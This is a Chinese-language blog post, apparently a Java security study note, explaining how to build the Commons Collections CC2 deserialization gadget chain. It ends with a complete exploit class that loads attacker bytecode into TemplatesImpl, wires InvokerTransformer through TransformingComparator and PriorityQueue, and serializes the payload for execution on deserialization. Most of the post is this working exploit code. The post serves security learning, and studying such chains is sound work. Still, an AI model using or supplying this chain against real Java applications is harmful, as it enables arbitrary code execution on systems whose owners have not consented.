---
title: cc2
date: 2026-08-06 11:02:54
categories:
  - java代码审计
tags:
  - Java
  - 反序列化
  - Commons Collections
---

## cc2

在 CC4 链的基础上，抛弃了用 `InstantiateTransformer` 类将 `TrAXFilter` 初始化，以及 `TemplatesImpl.newTransformer()` 这个步骤

那么我们简单分析 CC2 链的前半部分，还是出现了 compare 这些，所以在 CC4 链中的 compare 部分是可用的。在 CC2 链最后部分是 TemplatesImpl 执行动态字节码，和 CC4 链最后的部分是相等的，我们可以直接搬进来。

- 难点在于用 `InvokerTransformer` 的连接。

我们先把 CC4 链的 EXP 粘贴一下，并且使用 `InvokerTransform` 连接链子。

我们还是一步步来，首先是 `TemplatesImpl` 这里后面的链子

```java
TemplatesImpl templates = new TemplatesImpl();  
Class templatesClass = templates.getClass();  
Field nameField = templatesClass.getDeclaredField("_name");  
nameField.setAccessible(true);  
nameField.set(templates,"roxci");  
  
Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
bytecodesField.setAccessible(true);  
byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
byte[][] codes = {evil};  
bytecodesField.set(templates,codes);
```

CC2 链区别与其他链子一点的区别在于没有用 `Transformer` 数组。不用数组是因为比如 shiro 当中的漏洞，它会重写很多动态加载数组的方法，这就可能会导致我们的 EXP 无法通过数组实现。

构造 InvokerTransformer 类去调用`templates`对象的`newTransformer`方法：

JAVA

```
InvokerTransformer invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});  
```

创建 TransformingComparator 类对象，传⼊一个临时的 Transformer 类对象，这是为了让代码能够不本地执行，在反序列化的时候执行。

```
TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
```

创建 PriorityQueue 类对象 传入 `transformingComparator` 对象，但是此时向队列⾥添加的元素就是我们前⾯创建的 `TemplatesImpl` 对象了，这是因为最后调用 `PriorityQueue.compare()` 的时候是传入队列中的两个对象，然后 `compare()` 中调用 `Transformer.transform(obj1)` 的时候用的是传入的第一个对象作为参数，因此这里需要将 priorityQueue 队列中的第一个对象设置为构造好的 `templates` 对象，这里贪方便就两个都设置为 `templates` 对象了。

```java
PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);  
priorityQueue.add(templates);  
priorityQueue.add(templates);
```

- 最后再将值通过反射改回来。

```java
Class c = transformingComparator.getClass();  
Field transformingField = c.getDeclaredField("transformer");  
transformingField.setAccessible(true);  
transformingField.set(transformingComparator, invokerTransformer);
```

> 最终完整的 EXP 如下

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.functors.ConstantTransformer;  
import org.apache.commons.collections4.functors.InvokerTransformer;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
// 因为 CC2 是基于 CC4 的，所以大部分链子都差不多，直接写了  
public class CC2EXP {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 InvokerTransformer invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});  
 TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));  
 PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);  
 priorityQueue.add(templates);  
 priorityQueue.add(templates);  
  
 Class c = transformingComparator.getClass();  
 Field transformingField = c.getDeclaredField("transformer");  
 transformingField.setAccessible(true);  
 transformingField.set(transformingComparator, invokerTransformer);  
 serialize(priorityQueue);  
 unserialize("ser.bin");  
 }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
```

